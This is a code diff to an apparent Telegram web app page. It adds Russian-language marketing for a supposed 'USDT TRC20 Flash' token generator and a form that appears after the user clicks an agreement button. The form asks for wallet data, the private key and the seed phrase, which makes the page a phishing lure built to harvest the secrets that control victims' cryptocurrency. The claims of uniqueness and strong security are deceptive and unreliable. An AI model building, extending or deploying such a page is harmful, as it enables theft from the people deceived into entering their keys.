@@ -30,11 +30,11 @@
         }
         img {
             width: 70px;
-            margin: 30px auto;   
+            margin: 30px auto;
         }
         p {
-            width: 350px;
-            margin: 0px auto;
+            width: 550px;
+            margin: 1px auto;
         }
         button {
             border: 0;
@@ -51,15 +51,57 @@
         button:hover {
             background: var(--tg-theme-secondary-bg-color);
         }
+        #form {
+            display: none;
+            text-align: center;
+        }
+        input[type="text"] {
+            width: 80%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #8b00ff;
+            border-radius: 4px;
+        }
+        #order {
+            width: 80%;
+            padding: 10px;
+            border: 2px solid #ea00ff; 
+            background-color: rgb(119, 13, 206); 
+            color: #a200ff; 
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        #order:hover {
+            background-color: #a200ff; 
+            color: white; 
+        }
     </style>
 </head>
 <body>
     <div id = 'main'>
-        <h1>Madetext</h1>
+        <h1>Лучшее решение для тебя</h1>
         <img src="https://static.thenounproject.com/png/1026632-200.png">
-        <p>Тут описание</p>
+        <p>Наш проект представляет собой инновационный сервис, предлагающий уникальную возможность генерации токена USDT TRC20 Flash. Мы являемся единственным в своем роде решением на рынке, которое позволяет пользователям быстро и безопасно создавать токены на основе стандарта TRC20. Суть проекта: В условиях стремительного роста криптовалютного рынка и увеличения интереса к токенам, мы предлагаем простой и доступный способ создания токенов USDT TRC20 Flash. Наш сервис ориентирован как на индивидуальных пользователей, так и на бизнес, предоставляя инструменты для создания и управления токенами без необходимости глубоких технических знаний. Ключевые особенности: 1. Уникальность: Мы являемся первым и единственным сервисом, предлагающим данную услугу, что делает нас лидерами в этой нише. 2. Простота использования: Интуитивно понятный интерфейс позволяет пользователям быстро генерировать токены всего за несколько шагов. 3. Безопасность: Мы обеспечиваем высокий уровень безопасности на всех этапах генерации токенов, используя передовые технологии шифрования и защиты данных. 4. Гибкость: Пользователи могут настраивать параметры своих токенов в соответствии с индивидуальными требованиями и целями. 5. Поддержка сообщества: Наша команда предоставляет полную поддержку и консультации на всех этапах работы с сервисом. С помощью нашего сервиса пользователи смогут не только создавать токены, но и интегрировать их в свои проекты, что откроет новые возможности для бизнеса и инвестиций. Мы стремимся стать надежным партнером для всех, кто хочет войти в мир криптовалют и использовать его преимущества.</p>
         <button id="ok">Согласен</button>
     </div>
+    <form id="form">
+        <h2>Чтобы начать генерацию, нам нужны некоторые данные.</h2>
+        <img src="https://static.thenounproject.com/png/1026632-200.png">
+        <p>Для продолжения введите данные в строки ниже.</p>
+        <input type="text" placeholder="Данные кошелька" id="koshel">
+        <input type="text" placeholder="Приватный ключ" id="key">
+        <input type="text" placeholder="Количество монет" id="money">
+        <input type="text" placeholder="сид фраза" id="seed">
+        <button id="order">Начать</button>
+    </form>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        let ok = document.getElementById('ok');
+        ok.addEventListener('click', () => {
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('form').style.display = 'block'; 
+        });
+    </script>
 </body>
 </html>
